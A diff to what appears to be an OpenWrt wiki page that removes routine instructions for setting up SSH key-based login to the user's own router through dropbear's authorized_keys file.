-     ssh-keygen -t dsa
-
-##### Next copy the public key with SCP to OpenWrt:
-   
-    scp ~/.ssh/id_dsa.pub root@192.168.1.1:/tmp
-
-##### Add the public key to the authorized_keys from ~/.ssh/id_dsa.pub
-
-     cd /etc/dropbear
-     cat /tmp/id_*.pub >> authorized_keys
-     chmod 0600 authorized_keys
-     exit
-  
-##### Disconnect from your router and type following on your pc:
-   
-     ssh root@192.168.1.1 "tee -a /etc/dropbear/authorized_keys" < ~/.ssh/id_rsa.pub
-     
-##### Connect to your router without any password.
-   
-     ssh root@192.168.1.1
- 
+       
 ### Have fun and be careful with other settings not provided by me! ;)
 
 #### THIS WIKI IS LICENSED UNDER MIT
